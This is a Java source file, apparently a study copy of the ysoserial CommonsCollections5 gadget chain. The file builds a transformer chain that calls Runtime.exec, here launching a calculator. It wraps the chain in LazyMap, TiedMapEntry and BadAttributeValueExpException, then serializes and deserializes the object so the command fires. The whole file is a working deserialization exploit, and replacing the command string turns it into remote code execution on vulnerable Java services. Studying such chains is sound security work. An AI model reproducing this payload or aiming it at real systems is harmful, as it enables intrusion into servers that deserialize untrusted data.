package ysoserial.payloads.forlearn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5_Simple_LazyMap {

    public static void main(String[] args) {
        try {
            Transformer[] transformers = new Transformer[]{
                //Runtime类没有实现 java.io.Serializable 接口，
                //   所以不能被序列化，所以得换以下这种方式
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                    new Class[]{String.class},
                    new Object[]{"open -a Calculator"}
                ),
            };

            Transformer transformerChain = new ChainedTransformer(transformers);

            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);

            TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "foo");
            BadAttributeValueExpException badAttrValExpException = new BadAttributeValueExpException(null);

            Field val = badAttrValExpException.getClass().getDeclaredField("val");
            val.setAccessible(true);
            val.set(badAttrValExpException, tiedMapEntry);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(badAttrValExpException);
            System.out.println(baos.toString());

            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
            Object o = ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
